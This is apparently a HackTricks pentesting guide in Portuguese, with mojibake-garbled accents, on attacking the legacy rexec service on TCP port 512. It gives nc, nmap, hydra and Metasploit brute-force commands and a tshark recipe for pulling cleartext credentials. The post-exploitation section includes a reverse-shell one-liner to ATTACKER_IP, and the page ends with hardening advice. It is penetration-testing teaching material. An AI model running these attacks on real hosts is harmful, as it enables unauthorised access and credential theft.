# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## Informa√ß√µes B√°sicas

Rexec (remote **exec**) √© um dos servi√ßos originais da su√≠te Berkeley *r* (junto com `rlogin`, `rsh`, ‚Ä¶). Ele fornece uma capacidade de **execu√ß√£o remota de comandos** **autenticada apenas com um nome de usu√°rio e senha em texto claro**. O protocolo foi definido no in√≠cio dos anos 1980 (veja RFC 1060) e hoje √© considerado **inseguro por design**. No entanto, ainda est√° habilitado por padr√£o em alguns equipamentos legados UNIX / conectados √† rede e ocasionalmente aparece durante pentests internos.

**Porta Padr√£o:** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> üî• Todo o tr√°fego ‚Äì incluindo credenciais ‚Äì √© transmitido **n√£o criptografado**. Qualquer um com a capacidade de monitorar a rede pode recuperar o nome de usu√°rio, senha e comando.

### Vis√£o r√°pida do protocolo

1. O cliente se conecta ao TCP 512.
2. O cliente envia tr√™s strings **terminadas em NUL**:
* o n√∫mero da porta (como ASCII) onde deseja receber stdout/stderr (geralmente `0`),
* o **nome de usu√°rio**,
* a **senha**.
3. Uma string final terminada em NUL com o **comando** a ser executado √© enviada.
4. O servidor responde com um √∫nico byte de status de 8 bits (0 = sucesso, `1` = falha) seguido pela sa√≠da do comando.

Isso significa que voc√™ pode reproduzir a troca com nada mais do que `echo -e` e `nc`:
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
Se as credenciais forem v√°lidas, voc√™ receber√° a sa√≠da de `id` diretamente na mesma conex√£o.

### Uso manual com o cliente

Muitas distribui√ß√µes Linux ainda incluem o cliente legado dentro do pacote **inetutils-rexec** / **rsh-client**:
```bash
rexec -l user -p password <target> "uname -a"
```
Se `-p` for omitido, o cliente solicitar√° interativamente a senha (vis√≠vel na rede em texto claro!).

---
## Enumera√ß√£o & For√ßa Bruta

### [**For√ßa Bruta**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
O `rexec-brute` NSE usa o protocolo descrito acima para tentar credenciais muito rapidamente.

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` tem um m√≥dulo **rexec** dedicado e continua sendo o bruteforcer offline mais r√°pido. `medusa` (`-M REXEC`) e `ncrack` (m√≥dulo `rexec`) podem ser usados da mesma forma.

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
O m√≥dulo ir√° gerar um shell com sucesso e armazenar as credenciais no banco de dados.

---
## Captura de credenciais

Como tudo est√° em texto claro, **as capturas de rede s√£o inestim√°veis**. Com uma c√≥pia do tr√°fego, voc√™ pode extrair credenciais sem tocar no alvo:
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark, ative *Decode As ‚Ä¶‚Äã* TCP 512 ‚Üí REXEC para visualizar os campos analisados de forma adequada.)

---
## Dicas de P√≥s-Explora√ß√£o

* Comandos s√£o executados com os privil√©gios do usu√°rio fornecido. Se `/etc/pam.d/rexec` estiver mal configurado (por exemplo, `pam_rootok`), shells de root s√£o √†s vezes poss√≠veis.
* Rexec ignora o shell do usu√°rio e executa o comando via `/bin/sh -c <cmd>`. Voc√™ pode, portanto, usar truques t√≠picos de escape de shell (`;`, ``$( )``, crase) para encadear m√∫ltiplos comandos ou gerar shells reversos:
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* Senhas s√£o frequentemente armazenadas em **~/.netrc** em outros sistemas; se voc√™ comprometer um host, pode reutiliz√°-las para movimenta√ß√£o lateral.

---
## Fortalecimento / Detec√ß√£o

* **N√£o exponha rexec**; substitua-o por SSH. Praticamente todos os *inetd* superservers modernos comentam o servi√ßo por padr√£o.
* Se voc√™ precisar mant√™-lo, restrinja o acesso com TCP wrappers (`/etc/hosts.allow`) ou regras de firewall e imponha senhas fortes por conta.
* Monitore o tr√°fego para :512 e para lan√ßamentos do processo `rexecd`. Uma √∫nica captura de pacote √© suficiente para detectar uma comprometimento.
* Desative `rexec`, `rlogin`, `rsh` juntos ‚Äì eles compartilham a maior parte do mesmo c√≥digo e fraquezas.

---

## Refer√™ncias

* Documenta√ß√£o do Nmap NSE `rexec-brute` ‚Äì [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* M√≥dulo Rapid7 Metasploit `auxiliary/scanner/rservices/rexec_login` ‚Äì [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
